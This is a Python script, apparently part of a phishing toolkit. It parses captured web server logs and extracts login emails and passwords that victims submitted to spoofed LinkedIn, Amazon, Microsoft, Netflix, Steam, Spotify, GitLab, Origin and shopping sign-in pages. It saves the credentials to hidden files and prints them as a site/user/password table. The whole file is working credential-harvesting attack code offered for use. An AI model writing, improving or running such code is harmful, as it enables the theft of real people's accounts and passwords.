#!/usr/bin/env pyhton
import os
import re
import sys
import time
import subprocess
from urllib.parse import unquote 
from subprocess import PIPE

user_name   = os.path.dirname(os.path.abspath(__file__)).split ("/")[2]
Path_St = str("/".join(os.path.dirname(__file__).split('/')[:-1]))
group  = "chown "+ user_name+ ":"+user_name +" "+ Path_St+'/ServerLog/*'
os.system(group)
class dns_result :     
      def __init__(self):

         self.web_Password()
      def web_Password(self):
          print(" "+"-"*102)
          print("| "+f"{'       Site-Name    ':<20}",' |'+f"{'       auth_user    ':<35}","  | "+f"{'         PASSWORD   ':<35}   |")
          print(" "+"-"*102)
          list_web = []
          with open(Path_St+'/ServerLog/.web.txt','w') as file:
                with open (Path_St+'/ServerLog/.Cread.txt','w') as Cread_User :
                   pass
          with open(Path_St+'/ServerLog/log_error.log') as Log_Handel :
              Log_read = Log_Handel.readlines()
          for line in Log_read:     
              if '%40'in  line :
                try: 
                    if "&sgnBt" in line :
                        #shopping
                        rego      = str(re.findall("[&userid=]\D+\S%40+.+",line)).split('=')
                        line_cread_1  = unquote(rego[1][:-5])
                        line_cread_2  = unquote(rego[2][:-6])
                    elif "&session_key" in line :
                        #linkedin
                        rego = str(re.findall("&session_key\D+\S%40+.+",line)).split("=")
                        line_cread_1  = unquote(rego[1][:-17])
                        line_cread_2  = unquote(rego[2][:-4])
                    elif "openid.claimed_id" in line:
                         #amazon
                         rego = str(re.findall("&email=.+",line)).split('=')
                         line_cread_1  = unquote(rego[1][:-7])
                         line_cread_2  = unquote(rego[3][:-2])
                    elif "username=" in line:
                          #create-gitlabe-steam-spotify
                          rego = str(re.findall("username.+",line)).split("&") 
                          if "commit=Sign+in']" in rego:
                              line_cread_1 = unquote(rego[0][11:])
                              line_cread_2 = unquote(rego[1][9:])
                          elif "&captcha_text=" in line :  
                              line_cread_1 = unquote(rego[0][11:])
                              line_cread_2 = unquote(rego[1][9:])  
                          elif "g-recaptcha-response=']" in rego :
                              line_cread_1 = unquote(rego[0][11:])
                              line_cread_2 = unquote(rego[1][9:]) 
                          else:    
                              line_cread_1 =unquote(rego[0][11:])
                              line_cread_2  = unquote(rego[1][9:-2])                              
                    elif "IsFidoSupported=" in line : 
                          #microsoft
                          rego = str("".join(re.findall("[^=]",line))).split("&")
                          line_cread_1  = unquote(rego[0][-23:])
                          line_cread_2  = unquote(rego[1][6:])                          
                    elif "csrf=" in line :
                          #myspace
                          rego = str(re.findall("[&email=]\D+\S%40+.+",line)).split('=') 
                          if "&pageId" in line: 
                              line_cread_1  = unquote(rego[1][:-9])
                              line_cread_2  = unquote(rego[2][:-7])
                          else:    
                              line_cread_1  = unquote(rego[1][:-9])
                              line_cread_2  = unquote(rego[2][:-11]) 
                    elif "Cemail&authURL" in line :
                          #netflax
                          rego = str(re.findall("[&email=]\D+\S%40+.+",line)).split('=') 
                          line_cread_1  = unquote(rego[1][:-9])
                          line_cread_2  = unquote(rego[2][:-11])  
                    elif "submit&cid=Thg7" in line :
                          #origin
                          rego = str(re.findall("[&email=]\D+\S%40+.+",line)).split('=')
                          line_cread_1  = unquote(rego[1][:-9])
                          line_cread_2  = unquote(rego[2][:-9])  
                    elif "&redirect=&login=" in line :
                          rego = str(re.findall("[&login=]\D+\S%40+.+",line)).split('=')
                          line_cread_1  = unquote(rego[2][:-9])
                          line_cread_2  = unquote(rego[3][:-21])            
                    with open (Path_St+'/ServerLog/.Cread.txt','a') as Cread_User :
                        if line_cread_1 == "":
                              Cread_User.write("---------"+'\n'+line_cread_2.replace("%40",'@')+'\n')
                        elif line_cread_2 == "": 
                              Cread_User.write(line_cread_1.replace("%40",'@')+'\n'+"------"+'\n')   
                        else:
                              Cread_User.write(line_cread_1.replace("%40",'@')+'\n'+line_cread_2.replace("%40",'@')+'\n')
                except IndexError:
                       pass          
                with open(Path_St+'/ServerLog/log_access.log','r') as accesslog:
                        accesslog = accesslog.readlines()#[-243:]
                for line1 in accesslog:    
                      if "POST"  or "GET"in line1:
                          self.domain_web = str(re.findall('https?://(www\.)?([a-zA-Z0-9]+)(\.[a-zA-Z0-9.-]+)', line1 ))\
                          .replace("[('', '",'').replace("')]",'').replace("', '.",'.').replace('[]','').replace('\n','')
                          if self.domain_web not in  list_web:
                               list_web.append(self.domain_web) 
          with open(Path_St+'/ServerLog/.web.txt','r')as FileWeb:
              if list_web in FileWeb:
                    pass
              else:
                  with open(Path_St+'/ServerLog/.web.txt','a') as FileWeb :
                      WebVisit = FileWeb.write(str(list_web)\
                      .replace("['', '",'').replace("']",'').replace("', '",'\n').replace("['",''))
          with open(Path_St+'/ServerLog/.web.txt','r')as FileWeb :
                WebVisit = FileWeb.read().split()             
          with open (Path_St+'/ServerLog/.Cread.txt','r') as Cread_User :  
                Cread_auth = Cread_User.read().split()
          count = 0
          count1 = 0   
          try:     
            for i in range(len(WebVisit)):       
                print("| "+"  "+f"{ WebVisit[count]:<20}"+"|  "
                +f"{  Cread_auth[count1]   :<35}","| "+"  "+f"{     Cread_auth[count1+1]  :<34}  |")  
                count  +=1
                count1 +=2
          except IndexError:
              pass    
      
if __name__ =='__main__':
     dns_result()  